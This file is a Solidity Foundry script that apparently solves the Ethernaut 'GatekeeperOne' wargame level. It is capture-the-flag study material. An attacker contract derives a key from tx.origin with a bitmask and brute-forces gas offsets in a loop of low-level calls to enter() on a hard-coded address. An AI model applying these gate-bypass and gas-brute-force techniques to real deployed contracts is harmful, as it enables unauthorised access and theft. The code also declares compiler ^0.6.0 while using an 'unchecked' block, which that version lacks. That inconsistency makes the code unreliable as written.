// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../src/level13.sol";

contract POC is Script {
    GatekeeperOne level13 =
        GatekeeperOne(0x1108d88f4565D6164d52dDd23438f797d9597F59);

    function run() external {
        vm.startBroadcast();

        GatekeeperOneAttacker attacker = new GatekeeperOneAttacker(
            address(level13)
        );
        attacker.exploit();

        vm.stopBroadcast();
    }
}

contract GatekeeperOneAttacker {
    address gatekeeper;

    constructor(address _gatekeeper) public {
        gatekeeper = _gatekeeper;
    }

    function exploit() public {
        for (uint256 i = 0; i < 300; ) {
            bytes8 key = bytes8(uint64(tx.origin)) & 0xFFFFFFFF0000FFFF;
            (bool success, ) = address(gatekeeper).call{gas: i + (8191 * 3)}(
                abi.encodeWithSignature("enter(bytes8)", key)
            );
            if (success) {
                break;
            }
            unchecked {
                ++i;
            }
        }
    }
}
